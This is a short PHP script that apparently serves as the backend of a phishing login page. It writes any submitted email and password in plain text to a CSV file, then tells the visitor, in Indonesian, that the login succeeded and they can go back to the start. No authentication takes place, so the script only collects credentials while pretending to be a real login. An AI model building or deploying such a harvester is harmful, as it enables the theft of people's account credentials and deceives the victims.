<?php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $email = $_POST['email'];
  $pw = $_POST['password'];

  $data = array($email, $pw);

  $file = fopen('data.csv', 'a');
  fputcsv($file, $data);
  fclose($file);

  echo "Login Berhasil, Silahkan kembali ke awal";
}
?>
